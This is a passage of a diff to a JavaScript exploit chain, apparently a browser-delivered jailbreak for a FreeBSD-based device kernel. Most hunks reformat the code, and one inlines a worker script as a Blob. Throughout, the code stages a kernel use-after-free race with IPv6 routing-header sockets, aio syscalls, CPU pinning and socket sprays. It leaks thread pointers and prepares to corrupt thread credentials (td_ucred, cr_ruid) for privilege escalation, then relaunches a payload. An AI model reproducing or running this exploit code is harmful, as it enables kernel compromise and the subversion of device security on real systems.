+          tdv.getUint32(0, true),
+          tdv.getUint32(4, true),
+        );
         payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
         check(
           "JB-RELAUNCH",
           payloadRunning,
-          "file=" + PAYLOAD_FILE + " bytes=" + blob.length + " pthread_create=" + rc + " handle=" + handle
+          "file=" +
+            PAYLOAD_FILE +
+            " bytes=" +
+            blob.length +
+            " pthread_create=" +
+            rc +
+            " handle=" +
+            handle,
         );
       }
       const pid = sc(SYS.getpid).i32;
       check(
         "chain-reaches-kernel",
         pid > 0,
-        "pid=" + pid + " uid=" + sc(SYS.getuid).i32
+        "pid=" + pid + " uid=" + sc(SYS.getuid).i32,
       );
       if (SKIPJB) {
         const SETUID = 23;
         if (!stubAddr.has(SETUID))
           for (let o = 0; o < off.k_scan_stage1; o += 16) {
             const v = p.read8(libkernelBase.add32(o));
-            if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73)
-              continue;
-            if ((v.low >>> 24 | (v.hi & 16777215) << 8) >>> 0 === SETUID) {
+            if ((v.low & 16777215) !== 12633928 || v.hi >>> 24 !== 73) continue;
+            if (((v.low >>> 24) | ((v.hi & 16777215) << 8)) >>> 0 === SETUID) {
               stubAddr.set(SETUID, libkernelBase.add32(o));
               break;
             }
@@ -2961,12 +3392,16 @@
             jailbroken = true;
             mark(
               "JB-ALREADY",
-              "kernel already patched -- 663 race skipped, pid=" + pid
+              "kernel already patched -- 663 race skipped, pid=" + pid,
             );
             if (DO_PAYLOAD) await relaunchPayload();
             mark(
               "EG-VERDICT",
-              "fw=" + fwKey + " jailbroken=1 kpatched=already payload_running=" + (payloadRunning ? 1 : 0) + " armings=0 reused=1"
+              "fw=" +
+                fwKey +
+                " jailbroken=1 kpatched=already payload_running=" +
+                (payloadRunning ? 1 : 0) +
+                " armings=0 reused=1",
             );
             allDone = true;
             return;
@@ -2978,36 +3413,65 @@
       const scratch = bufAddr(scratchAb);
       const argAb = new ArrayBuffer(8);
       keepAlive2.push(argAb);
-      const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
+      const argAddr = bufAddr(argAb),
+        argDv = new DataView(argAb);
       const lenAb = new ArrayBuffer(8);
       keepAlive2.push(lenAb);
-      const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);
-      const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
-      const AF_INET6 = 28, SOCK_DGRAM = 2, AF_UNIX = 1, SOCK_STREAM = 1;
+      const lenAddr = bufAddr(lenAb),
+        lenDv = new DataView(lenAb);
+      const IPPROTO_IPV6 = 41,
+        IPV6_RTHDR = 51;
+      const AF_INET6 = 28,
+        SOCK_DGRAM = 2,
+        AF_UNIX = 1,
+        SOCK_STREAM = 1;
       const numArg = parseInt(params.get("num") || "", 10);
-      const NUM = Number.isFinite(numArg) && numArg >= 2 && numArg <= 128 ? numArg : 9;
+      const NUM =
+        Number.isFinite(numArg) && numArg >= 2 && numArg <= 128 ? numArg : 9;
       const RTH_N = NUM > 2 ? 16 : 4;
-      const RTH_SIZE = 16 * RTH_N + 8, RTH_LEN = 2 * RTH_N, RTH_SEGLEFT = RTH_N;
-      const SCRATCH_PAGE = RTH_N << 24 >>> 0, NODE0_DEC = (RTH_N << 24 | RTH_LEN << 8) >>> 0;
+      const RTH_SIZE = 16 * RTH_N + 8,
+        RTH_LEN = 2 * RTH_N,
+        RTH_SEGLEFT = RTH_N;
+      const SCRATCH_PAGE = (RTH_N << 24) >>> 0,
+        NODE0_DEC = ((RTH_N << 24) | (RTH_LEN << 8)) >>> 0;
       const SYS_MMAP = 477;
-      const PROT_RW = 3, MAP_PRIVATE = 2, MAP_FIXED = 16, MAP_ANON = 4096;
+      const PROT_RW = 3,
+        MAP_PRIVATE = 2,
+        MAP_FIXED = 16,
+        MAP_ANON = 4096;
       const NODE_SZ = 56;
       const N_LEAK = params.get("n") ? parseInt(params.get("n"), 10) : 262144;
-      const SPRAY = params.get("spray") ? parseInt(params.get("spray"), 10) : 512;
+      const SPRAY = params.get("spray")
+        ? parseInt(params.get("spray"), 10)
+        : 512;
       const SPIN = params.get("spin") ? parseInt(params.get("spin"), 10) : 4e7;
       const CUT = params.get("cut") !== "0";
-      const CUT_MARGIN = params.get("cutmargin") ? parseInt(params.get("cutmargin"), 10) : 8192;
+      const CUT_MARGIN = params.get("cutmargin")
+        ? parseInt(params.get("cutmargin"), 10)
+        : 8192;
       mark(
         "PR-CFG",
-        "nleak=" + N_LEAK + " spray=" + SPRAY + " spin=" + SPIN + " cut=" + (CUT ? CUT_MARGIN : 0)
+        "nleak=" +
+          N_LEAK +
+          " spray=" +
+          SPRAY +
+          " spin=" +
+          SPIN +
+          " cut=" +
+          (CUT ? CUT_MARGIN : 0),
       );
       async function bringWorker(name) {
         const w = { name, armed: false, wired: false };
-        w.worker = new Worker("/js/rpc_worker.js");
+        const blob = new Blob([rpc_worker_default], {
+          type: "application/javascript",
+        });
+        const workerUrl = URL.createObjectURL(blob);
+        w.worker = new Worker(workerUrl);
         w.rpc = makeRpc(w.worker, name);
-        if (await w.rpc("ping", 15e3) !== "pong")
+        if ((await w.rpc("ping", 15e3)) !== "pong")
           throw new Error(name + " ping");
-        const sLo = 269484032, sHi = 3235774464;
+        const sLo = 269484032,
+          sHi = 3235774464;
         const arr = await w.rpc("init", 15e3, sLo, sHi);
         keepAlive2.push(arr);
         const D = bufAddr(arr.buffer);
@@ -3016,7 +3480,9 @@
         const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
         if (!mc || !ptrish(mc)) throw new Error(name + " walk");
         const bf = p.read8(mc.add32(8));
-        let wm = null, wv = null, wl = null;
+        let wm = null,
+          wv = null,
+          wl = null;
         for (let k = 1; k <= 8; ++k) {
           const val = p.read8(bf.sub32(8 * k));
           if (!ptrish(val)) continue;
@@ -3039,13 +3505,13 @@
         await w.rpc("armPivot", 15e3, G.G0.low, G.G0.hi);
         w.armed = true;
         w.ctx = makeCtx();
-        w.fire = function(num, args, ms) {
+        w.fire = function (num, args, ms) {
           layout(w.ctx, stubAddr.get(num), args);
           return w.rpc(
             "fire",
             ms === void 0 ? 2e4 : ms,
             w.ctx.S.low,
-            w.ctx.S.hi
+            w.ctx.S.hi,
           );
         };
         return w;
@@ -3059,20 +3525,56 @@
       check(
         "pr-two-workers-reach-kernel",
         w1pid > 0 && w2pid > 0,
-        "w1 getpid=" + w1pid + " w2 getpid=" + w2pid + " main=" + sc(SYS.getpid).i32
+        "w1 getpid=" +
+          w1pid +
+          " w2 getpid=" +
+          w2pid +
+          " main=" +
+          sc(SYS.getpid).i32,
       );
       const zoneOf = (s) => {
-        const r = s & 15 ? s + 16 & ~15 : s;
+        const r = s & 15 ? (s + 16) & ~15 : s;
         let z = 16;
         while (z < r) z <<= 1;
         return z;
       };
-      const geomOk = RTH_SIZE === 8 * (RTH_LEN + 1) && (RTH_LEN & 1) === 0 && RTH_LEN !== 0 && RTH_SEGLEFT === RTH_LEN / 2 && NODE0_DEC === (RTH_SEGLEFT << 24 | RTH_LEN << 8) >>> 0 && NODE0_DEC >= SCRATCH_PAGE && NODE0_DEC < SCRATCH_PAGE + 65536 - 4 && !(NODE0_DEC >= SCRATCH_PAGE + (NUM > 2 ? 32768 : 8192) && NODE0_DEC < SCRATCH_PAGE + (NUM > 2 ? 32768 : 8192) + RTH_SIZE) && zoneOf(NUM * 56) === zoneOf(RTH_SIZE);
-      if (!check(
-        "pr-geometry-consistent",
-        geomOk,
-        "num=" + NUM + " victim=0x" + (NUM * 56).toString(16) + " rth=0x" + RTH_SIZE.toString(16) + " len=" + RTH_LEN + " segleft=" + RTH_SEGLEFT + " zone=" + zoneOf(NUM * 56) + "/" + zoneOf(RTH_SIZE) + " scratch=0x" + SCRATCH_PAGE.toString(16) + " node0_dec=0x" + NODE0_DEC.toString(16)
-      ))
+      const geomOk =
+        RTH_SIZE === 8 * (RTH_LEN + 1) &&
+        (RTH_LEN & 1) === 0 &&
+        RTH_LEN !== 0 &&
+        RTH_SEGLEFT === RTH_LEN / 2 &&
+        NODE0_DEC === ((RTH_SEGLEFT << 24) | (RTH_LEN << 8)) >>> 0 &&
+        NODE0_DEC >= SCRATCH_PAGE &&
+        NODE0_DEC < SCRATCH_PAGE + 65536 - 4 &&
+        !(
+          NODE0_DEC >= SCRATCH_PAGE + (NUM > 2 ? 32768 : 8192) &&
+          NODE0_DEC < SCRATCH_PAGE + (NUM > 2 ? 32768 : 8192) + RTH_SIZE
+        ) &&
+        zoneOf(NUM * 56) === zoneOf(RTH_SIZE);
+      if (
+        !check(
+          "pr-geometry-consistent",
+          geomOk,
+          "num=" +
+            NUM +
+            " victim=0x" +
+            (NUM * 56).toString(16) +
+            " rth=0x" +
+            RTH_SIZE.toString(16) +
+            " len=" +
+            RTH_LEN +
+            " segleft=" +
+            RTH_SEGLEFT +
+            " zone=" +
+            zoneOf(NUM * 56) +
+            "/" +
+            zoneOf(RTH_SIZE) +
+            " scratch=0x" +
+            SCRATCH_PAGE.toString(16) +
+            " node0_dec=0x" +
+            NODE0_DEC.toString(16),
+        )
+      )
         return;
       const mr = sc(
         SYS_MMAP,
@@ -3081,14 +3583,16 @@
         PROT_RW,
         MAP_FIXED | MAP_ANON | MAP_PRIVATE,
         -1,
-        0
+        0,
       );
       const mgot = new int64(mr.lo, mr.hi);
-      if (!check(
-        "pr-scratch-page-mapped",
-        mgot.hi >>> 0 === 0 && mgot.low >>> 0 === SCRATCH_PAGE,
-        "got=0x" + (mgot.low >>> 0).toString(16)
-      ))
+      if (
+        !check(
+          "pr-scratch-page-mapped",
+          mgot.hi >>> 0 === 0 && mgot.low >>> 0 === SCRATCH_PAGE,
+          "got=0x" + (mgot.low >>> 0).toString(16),
+        )
+      )
         return;
       const vs = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
       if (vs < 0) {
@@ -3102,7 +3606,14 @@
         const tDv = new DataView(tAb);
         tDv.setUint8(1, RTH_LEN);
         tDv.setUint8(3, RTH_SEGLEFT);
-        sc(SYS.setsockopt, vs, IPPROTO_IPV6, IPV6_RTHDR, bufAddr(tAb), RTH_SIZE);
+        sc(
+          SYS.setsockopt,
+          vs,
+          IPPROTO_IPV6,
+          IPV6_RTHDR,
+          bufAddr(tAb),
+          RTH_SIZE,
+        );
         const RT = SCRATCH_PAGE + (NUM > 2 ? 32768 : 8192);
         lenDv.setUint32(0, RTH_SIZE, true);
         lenDv.setUint32(4, 0, true);
@@ -3112,7 +3623,7 @@
           IPPROTO_IPV6,
           IPV6_RTHDR,
           RT,
-          lenAddr
+          lenAddr,
         ).i32;
         const s2 = sc(
           SYS.setsockopt,
@@ -3120,13 +3631,15 @@
           IPPROTO_IPV6,
           IPV6_RTHDR,
           RT,
-          lenDv.getUint32(0, true)
+          lenDv.getUint32(0, true),
         ).i32;
-        if (!check(
-          "pr-scratch-page-kernel-rw",
-          g1 === 0 && s2 === 0,
-          "copyout=" + g1 + " copyin=" + s2
-        ))
+        if (
+          !check(
+            "pr-scratch-page-kernel-rw",
+            g1 === 0 && s2 === 0,
+            "copyout=" + g1 + " copyin=" + s2,
+          )
+        )
           return;
       }
       const mAb = new ArrayBuffer(192);
@@ -3138,20 +3651,26 @@
       const M_AD = bufAddr(mAb);
       mU32.fill(0);
       mU32[6] = 4;
-      const OWNER_LO = 6, OWNER_HI = 7;
+      const OWNER_LO = 6,
+        OWNER_HI = 7;
       const lkAb = new ArrayBuffer(64);
       keepAlive2.push(lkAb);
-      const lkDv = new DataView(lkAb), lkAd = bufAddr(lkAb);
-      const LX = lkAd.add32(0), LC = lkAd.add32(16);
+      const lkDv = new DataView(lkAb),
+        lkAd = bufAddr(lkAb);
+      const LX = lkAd.add32(0),
+        LC = lkAd.add32(16);
       const NBLOCK = 8;
       const bspAb = new ArrayBuffer(8);
       keepAlive2.push(bspAb);
       const bspDv = new DataView(bspAb);
-      if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(bspAb)).i32 !== 0) {
+      if (
+        sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(bspAb)).i32 !== 0
+      ) {
         mark("PR-ABORT", "block socketpair");
         return;
       }
-      const bsp0 = bspDv.getInt32(0, true), bsp1 = bspDv.getInt32(4, true);
+      const bsp0 = bspDv.getInt32(0, true),
+        bsp1 = bspDv.getInt32(4, true);
       opened.push(bsp0, bsp1);
       const brbAb = new ArrayBuffer(64);
       keepAlive2.push(brbAb);
@@ -3166,11 +3685,14 @@
       }
       const bidAb = new ArrayBuffer(NBLOCK * 4);
       keepAlive2.push(bidAb);
-      const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1, CPUSET_SZ = 16;
+      const CPU_LEVEL_WHICH = 3,
+        CPU_WHICH_TID = 1,
+        CPUSET_SZ = 16;
       const ID64 = new int64(4294967295, 4294967295);
       const mskAb = new ArrayBuffer(CPUSET_SZ);
       keepAlive2.push(mskAb);
-      const mskDv = new DataView(mskAb), mskAd = bufAddr(mskAb);
+      const mskDv = new DataView(mskAb),
+        mskAd = bufAddr(mskAb);
       new Uint8Array(mskAb).fill(0);
       const affGot = sc(
         SYS.cpuset_getaffinity,
@@ -3178,34 +3700,45 @@
         CPU_WHICH_TID,
         ID64,
         CPUSET_SZ,
-        mskAd
+        mskAd,
       ).i32;
       const savedMask = mskDv.getUint32(0, true) >>> 0;
       const cores = [];
-      for (let i = 0; i < 32; i++) if (savedMask & 1 << i) cores.push(i);
+      for (let i = 0; i < 32; i++) if (savedMask & (1 << i)) cores.push(i);
       mark(
         "PIN-AVAIL",
-        "rv=" + affGot + " mask=0x" + savedMask.toString(16) + " cores=" + cores.join(",")
+        "rv=" +
+          affGot +
+          " mask=0x" +
+          savedMask.toString(16) +
+          " cores=" +
+          cores.join(","),
       );
-      if (!check(
-        "pin-read-mask",
-        affGot === 0 && cores.length > 0,
-        "rv=" + affGot + " cores=" + cores.length
-      ))
+      if (
+        !check(
+          "pin-read-mask",
+          affGot === 0 && cores.length > 0,
+          "rv=" + affGot + " cores=" + cores.length,
+        )
+      )
         return;
-      const coreArg = params.get("core") ? parseInt(params.get("core"), 10) : -1;
+      const coreArg = params.get("core")
+        ? parseInt(params.get("core"), 10)
+        : -1;
       const candidates = coreArg >= 0 ? [coreArg] : cores.slice();
-      let PINCORE = -1, affSet = -1, backMask = 0;
+      let PINCORE = -1,
+        affSet = -1,
+        backMask = 0;
       for (const c of candidates) {
         new Uint8Array(mskAb).fill(0);
-        mskDv.setUint32(0, 1 << c >>> 0, true);
+        mskDv.setUint32(0, (1 << c) >>> 0, true);
         affSet = sc(
           SYS.cpuset_setaffinity,
           CPU_LEVEL_WHICH,
           CPU_WHICH_TID,
           ID64,
           CPUSET_SZ,
-          mskAd
+          mskAd,
         ).i32;
         new Uint8Array(mskAb).fill(0);
         sc(
@@ -3214,52 +3747,67 @@
           CPU_WHICH_TID,
           ID64,
           CPUSET_SZ,
-          mskAd
+          mskAd,
         );
         backMask = mskDv.getUint32(0, true) >>> 0;
-        if (affSet === 0 && backMask === 1 << c >>> 0) {
+        if (affSet === 0 && backMask === (1 << c) >>> 0) {
           PINCORE = c;
           break;
         }
         mark(
           "PIN-REJECT",
-          "core=" + c + " rv=" + affSet + " back=0x" + backMask.toString(16)
+          "core=" + c + " rv=" + affSet + " back=0x" + backMask.toString(16),
         );
       }
       mark(
         "PIN-SET",
-        "core=" + PINCORE + " rv=" + affSet + " reads back 0x" + backMask.toString(16) + " tried=" + candidates.join(",")
+        "core=" +
+          PINCORE +
+          " rv=" +
+          affSet +
+          " reads back 0x" +
+          backMask.toString(16) +
+          " tried=" +
+          candidates.join(","),
       );
       if (PINCORE < 0 && retryBenign("pin-failed")) return;
-      if (!check(
-        "MAIN-PINNED",
-        PINCORE >= 0,
-        "core=" + PINCORE + " mask=0x" + backMask.toString(16) + " (free and malloc in armOnce now share one UMA per-cpu bucket)"
-      ))
+      if (
+        !check(
+          "MAIN-PINNED",
+          PINCORE >= 0,
+          "core=" +
+            PINCORE +
+            " mask=0x" +
+            backMask.toString(16) +
+            " (free and malloc in armOnce now share one UMA per-cpu bucket)",
+        )
+      )
         return;
       const otherCores = cores.filter((c) => c !== PINCORE);
       const msk2Ab = new ArrayBuffer(CPUSET_SZ);
       keepAlive2.push(msk2Ab);
-      const msk2Dv = new DataView(msk2Ab), msk2Ad = bufAddr(msk2Ab);
+      const msk2Dv = new DataView(msk2Ab),
+        msk2Ad = bufAddr(msk2Ab);
       const aw = [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, CPUSET_SZ, msk2Ad];
       async function pinWorker(w, c) {
         new Uint8Array(msk2Ab).fill(0);
-        msk2Dv.setUint32(0, 1 << c >>> 0, true);
+        msk2Dv.setUint32(0, (1 << c) >>> 0, true);
         await w.fire(SYS.cpuset_setaffinity, aw);
         const rv = w.ctx.frameDv.getUint32(0, true) | 0;
         new Uint8Array(msk2Ab).fill(0);
         await w.fire(SYS.cpuset_getaffinity, aw);
         const back = msk2Dv.getUint32(0, true) >>> 0;
-        return { rv, back, ok: rv === 0 && back === 1 << c >>> 0 };
+        return { rv, back, ok: rv === 0 && back === (1 << c) >>> 0 };
       }
-      let OTHER = -1, wpin = "none";
+      let OTHER = -1,
+        wpin = "none";
       for (let i = otherCores.length - 1; i >= 0; i--) {
         const c = otherCores[i];
         const p1 = await pinWorker(w1, c);
         if (!p1.ok) {
           mark(
             "PIN-WREJECT",
-            "core=" + c + " w1=" + p1.rv + " back=0x" + p1.back.toString(16)
+            "core=" + c + " w1=" + p1.rv + " back=0x" + p1.back.toString(16),
           );
           continue;
         }
@@ -3267,32 +3815,37 @@
         if (!p2.ok) {
           mark(
             "PIN-WREJECT",
-            "core=" + c + " w2=" + p2.rv + " back=0x" + p2.back.toString(16)
+            "core=" + c + " w2=" + p2.rv + " back=0x" + p2.back.toString(16),
           );
           continue;
         }
         OTHER = c;
-        wpin = "w1=" + p1.rv + " w2=" + p2.rv + " back=0x" + p2.back.toString(16);
+        wpin =
+          "w1=" + p1.rv + " w2=" + p2.rv + " back=0x" + p2.back.toString(16);
         break;
       }
       mark(
         "PIN-WSET",
-        "core=" + OTHER + " " + wpin + " tried=" + otherCores.join(",")
+        "core=" + OTHER + " " + wpin + " tried=" + otherCores.join(","),
       );
-      if (!check(
-        "WORKERS-PINNED",
-        OTHER >= 0,
-        "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin
-      )) {
+      if (
+        !check(
+          "WORKERS-PINNED",
+          OTHER >= 0,
+          "workers on core " + OTHER + ", main on " + PINCORE + " -- " + wpin,
+        )
+      ) {
         mark(
           "PIN-REFUSE",
-          "no worker core verifies apart from main=" + PINCORE + "; sharing it is the configuration that hangs"
+          "no worker core verifies apart from main=" +
+            PINCORE +
+            "; sharing it is the configuration that hangs",
         );
         return;
       }
       mark("PIN-SPLIT", "main=" + PINCORE + " workers=" + OTHER + " " + wpin);
-      pinRestore = function() {
-        const permitted = (1 << PINCORE | 1 << OTHER) >>> 0 || savedMask;
+      pinRestore = function () {
+        const permitted = ((1 << PINCORE) | (1 << OTHER)) >>> 0 || savedMask;
         function apply(m) {
           new Uint8Array(mskAb).fill(0);
           mskDv.setUint32(0, m, true);
@@ -3302,38 +3855,48 @@
             CPU_WHICH_TID,
             ID64,
             CPUSET_SZ,
-            mskAd
+            mskAd,
           ).i32;
         }
-        let used = savedMask, r = apply(savedMask);
+        let used = savedMask,
+          r = apply(savedMask);
         if (r !== 0 && permitted !== savedMask) {
           used = permitted;
           r = apply(permitted);
         }
         mark(
           "PIN-RESTORED",
-          "rv=" + r + " mask=0x" + used.toString(16) + " saved=0x" + savedMask.toString(16)
+          "rv=" +
+            r +
+            " mask=0x" +
+            used.toString(16) +
+            " saved=0x" +
+            savedMask.toString(16),
         );
       };
       mark(
         "PR-SATURATE",
-        "rv=" + sc(
-          SYS.aio_submit_cmd,
-          1 | 4096,
-          bufAddr(brqAb),
-          NBLOCK,
-          3,
-          bufAddr(bidAb)
-        ).i32
+        "rv=" +
+          sc(
+            SYS.aio_submit_cmd,
+            1 | 4096,
+            bufAddr(brqAb),
+            NBLOCK,
+            3,
+            bufAddr(bidAb),
+          ).i32,
       );
       const spAb = new ArrayBuffer(8);
       keepAlive2.push(spAb);
       const spDv = new DataView(spAb);
-      if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(spAb)).i32 !== 0) {
+      if (
+        sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, bufAddr(spAb)).i32 !== 0
+      ) {
         mark("PR-ABORT", "socketpair");
         return;
       }
-      const sp0 = spDv.getInt32(0, true), sp1 = spDv.getInt32(4, true);
+      const sp0 = spDv.getInt32(0, true),
+        sp1 = spDv.getInt32(4, true);
       opened.push(sp0, sp1);
       const rbAb = new ArrayBuffer(64);
       keepAlive2.push(rbAb);
@@ -3355,13 +3918,18 @@
       const stAd2 = bufAddr(stAb2);
       const toAb = new ArrayBuffer(8);
       keepAlive2.push(toAb);
-      const toDv = new DataView(toAb), toAd = bufAddr(toAb);
-      const TOWAIT = params.get("towait") ? parseInt(params.get("towait"), 10) : 1e3;
+      const toDv = new DataView(toAb),
+        toAd = bufAddr(toAb);
+      const TOWAIT = params.get("towait")
+        ? parseInt(params.get("towait"), 10)
+        : 1e3;
       toDv.setUint32(0, TOWAIT, true);
       toDv.setUint32(4, 0, true);
       mark(
         "PR-TOWAIT",
-        "aio_multi_wait timeout=" + TOWAIT + "us was=100000us deaths_in_that_sleep=all armings=4 exposure_was=400ms"
+        "aio_multi_wait timeout=" +
+          TOWAIT +
+          "us was=100000us deaths_in_that_sleep=all armings=4 exposure_was=400ms",
       );
       const POOL = [];
       for (let i = 0; i < SPRAY; i++) {
@@ -3372,16 +3940,19 @@
       }
       mark(
         "PR-POOL",
-        "reclaim sockets=" + POOL.length + " mad=" + M_AD + " lkad=" + lkAd
+        "reclaim sockets=" + POOL.length + " mad=" + M_AD + " lkad=" + lkAd,
       );
       const pAb = new ArrayBuffer(RTH_SIZE);
       keepAlive2.push(pAb);
-      const pDv = new DataView(pAb), pAd = bufAddr(pAb);
+      const pDv = new DataView(pAb),
+        pAd = bufAddr(pAb);
       const N0DEC = params.get("n0dec") !== "0";
-      const SOL_SOCKET = 65535, SO_TYPE = 4104;
+      const SOL_SOCKET = 65535,
+        SO_TYPE = 4104;
       const n0dAb = new ArrayBuffer(8);
       keepAlive2.push(n0dAb);
-      const n0dDv = new DataView(n0dAb), n0dAd = bufAddr(n0dAb);
+      const n0dDv = new DataView(n0dAb),
+        n0dAd = bufAddr(n0dAb);
       let armCount = 0;
       let waitMs = -1;
       let armTrace = false;
@@ -3394,7 +3965,9 @@
         mark("PR-REFUSE", "num=" + NUM + " needs reap=1 reapleak=1");
         return;
       }
-      let FAKEMISS = params.has("fakemiss") ? parseInt(params.get("fakemiss"), 10) : -1;
+      let FAKEMISS = params.has("fakemiss")
+        ? parseInt(params.get("fakemiss"), 10)
+        : -1;
       if (FAKEMISS >= 4) {
         mark("PR-FAKEMISS-REFUSED", "arming=" + FAKEMISS + " writes_kernel");
         FAKEMISS = -1;
@@ -3402,15 +3975,17 @@
       if (FAKEMISS >= 0)
         mark(
           "PR-FAKEMISS",
-          "arming=" + FAKEMISS + " armings_are_1_based leak_arming=1"
+          "arming=" + FAKEMISS + " armings_are_1_based leak_arming=1",
         );
       let reapedGen = -1;
       let reapAt = 0;
       const lkNodes = new ArrayBuffer(NODE_SZ * N_LEAK);
       keepAlive2.push(lkNodes);
-      const lkNdv = new DataView(lkNodes), lkNad = bufAddr(lkNodes);
+      const lkNdv = new DataView(lkNodes),
+        lkNad = bufAddr(lkNodes);
       const lkF64 = new Float64Array(lkNodes);
-      const NEXT_F64 = 48 / 8, STRIDE_F64 = NODE_SZ / 8;
+      const NEXT_F64 = 48 / 8,
+        STRIDE_F64 = NODE_SZ / 8;
       async function leakCurthread(w) {
         toDv.setUint32(0, TOWAIT, true);
         toDv.setUint32(4, 0, true);
@@ -3446,12 +4021,14 @@
           if (wu === 2147483647) mark("PR-WARM", "" + wu);
         }
         const samples = [];
-        let hitLo = 0, hitHi = 0, hits = 0;
+        let hitLo = 0,
+          hitHi = 0,
+          hits = 0;
         let pr = null;
         try {
           pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]);
         } catch (e) {
-          mark("PR-CANCEL-FIRE-ERR", e && e.message || String(e));
+          mark("PR-CANCEL-FIRE-ERR", (e && e.message) || String(e));
         }
         for (let i = 0; i < SPIN; i++) {
           mU8[128 + (i & 15)] = i & 255;
@@ -3467,14 +4044,16 @@
               hits++;
               if (samples.length < 32)
                 samples.push(
-                  (hi1 >>> 0).toString(16).padStart(8, "0") + (lo >>> 0).toString(16).padStart(8, "0")
+                  (hi1 >>> 0).toString(16).padStart(8, "0") +
+                    (lo >>> 0).toString(16).padStart(8, "0"),
                 );
               if (hits > 48) break;
             }
           }
         }
         const drop = 1073741824 - lkDv.getInt32(0, true);
-        let cutAt = -1, cutTries = 0;
+        let cutAt = -1,
+          cutTries = 0;
         if (CUT) {
           for (let m = CUT_MARGIN; m <= CUT_MARGIN << 3; m <<= 1) {
             const at = 1073741824 - lkDv.getInt32(0, true) + m;
@@ -3492,16 +4071,36 @@
         const keys = Object.keys(uniq);
         mark(
           "PR-LEAK",
-          w.name + " hits=" + hits + " walked=" + drop + "/" + N_LEAK + " samples=" + (keys.length ? keys.map((k) => k + " x" + uniq[k]).join(" ") : "none")
+          w.name +
+            " hits=" +
+            hits +
+            " walked=" +
+            drop +
+            "/" +
+            N_LEAK +
+            " samples=" +
+            (keys.length
+              ? keys.map((k) => k + " x" + uniq[k]).join(" ")
+              : "none"),
         );
         try {
           if (pr) await pr;
         } catch (e) {
-          mark("PR-WALK-AWAIT-ERR", e && e.message || String(e));
+          mark("PR-WALK-AWAIT-ERR", (e && e.message) || String(e));
         }
         mark(
           "PR-WALK-DONE",
-          w.name + " walked=" + (1073741824 - lkDv.getInt32(0, true)) + "/" + N_LEAK + " broke_at=" + drop + " cut=" + cutAt + " tries=" + cutTries
+          w.name +
+            " walked=" +
+            (1073741824 - lkDv.getInt32(0, true)) +
+            "/" +
+            N_LEAK +
+            " broke_at=" +
+            drop +
+            " cut=" +
+            cutAt +
+            " tries=" +
+            cutTries,
         );
         if (!hits || hitHi >>> 0 < 4294901760 || keys.length !== 1) return null;
         return new int64(hitLo >>> 0, hitHi >>> 0);
@@ -3519,7 +4118,10 @@
         const rlp = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
         mark("PR-REAPLEAK-P", "poll=" + rlp);
         const rld = sc(SYS.aio_multi_delete, idAd2, NUM, stAd2).i32;
-        mark("PR-REAPLEAK", "cancel=" + rlc + " poll=" + rlp + " delete=" + rld);
+        mark(
+          "PR-REAPLEAK",
+          "cancel=" + rlc + " poll=" + rlp + " delete=" + rld,
+        );
         reapAt = Date.now();
       } else {
         mark("PR-REAPLEAK", "skipped park=" + (PARK ? 1 : 0));
@@ -3533,17 +4135,19 @@
       }
       mark(
         "PR-CURTHREADS",
-        "w1=" + CT1 + " (w2 not leaked: one arming saved)  -- both workers are now PARKED and issue no further syscalls"
+        "w1=" +
+          CT1 +
+          " (w2 not leaked: one arming saved)  -- both workers are now PARKED and issue no further syscalls",
       );
       let parkFail = "";
       if (!PARK) {
         mark(
           "PR-PARK",
-          "skipped park=0 restore=self reapleak=" + (REAPLEAK ? 1 : 0)
+          "skipped park=0 restore=self reapleak=" + (REAPLEAK ? 1 : 0),
         );
       } else {
         const prev = w1.worker.onmessage;
-        w1.worker.onmessage = function(e) {
+        w1.worker.onmessage = function (e) {
           const d = e.data || {};
           if (d.id === -1) {
             parkFail += " " + (d.value || d.type);
@@ -3555,55 +4159,85 @@
         await new Promise((r) => setTimeout(r, 250));
         mark("PR-PARK", "w1 spin posted parkfail=" + (parkFail || "none"));
       }
-      if (PARK && !check(
-        "W1-PARKED",
-        parkFail === "",
-        parkFail ? "rpc_worker.js has no spin():" + parkFail + " -- reload, nothing kernel has been touched yet" : "w1 cannot reach syscallenter again, so cred_update_thread can never crfree() the wild td_ucred passA is about to create"
-      ))
+      if (
+        PARK &&
+        !check(
+          "W1-PARKED",
+          parkFail === "",
+          parkFail
+            ? "rpc_worker.js has no spin():" +
+                parkFail +
+                " -- reload, nothing kernel has been touched yet"
+            : "w1 cannot reach syscallenter again, so cred_update_thread can never crfree() the wild td_ucred passA is about to create",
+        )
+      )
         return;
-      const STEP_OFF = 2, STEP_MAG = 65536, PAIR = STEP_MAG + 1;
-      const TD_UCRED_OFF = 304, CR_RUID_OFF = 8;
+      const STEP_OFF = 2,
+        STEP_MAG = 65536,
+        PAIR = STEP_MAG + 1;
+      const TD_UCRED_OFF = 304,
+        CR_RUID_OFF = 8;
       const KA = params.get("ka") ? parseInt(params.get("ka"), 10) : 32768;
       const KB = PAIR;
       const dumAb = new ArrayBuffer(64);
       keepAlive2.push(dumAb);
-      const dumDv = new DataView(dumAb), dumAd = bufAddr(dumAb);
+      const dumDv = new DataView(dumAb),
+        dumAd = bufAddr(dumAb);
       dumDv.setInt32(0, 1073741824, true);
       const DUM = dumAd.add32(0);
       const snkAb = new ArrayBuffer(64);
       keepAlive2.push(snkAb);
-      const snkDv = new DataView(snkAb), snkAd = bufAddr(snkAb);
+      const snkDv = new DataView(snkAb),
+        snkAd = bufAddr(snkAb);
       const SNK = snkAd.add32(0);
       const N0SINK = snkAd.add32(32);
       const MAXN = 2 * KA + KB + 16;
       const arAb = new ArrayBuffer(NODE_SZ * MAXN);
       keepAlive2.push(arAb);
-      const arDv = new DataView(arAb), arAd = bufAddr(arAb);
+      const arDv = new DataView(arAb),
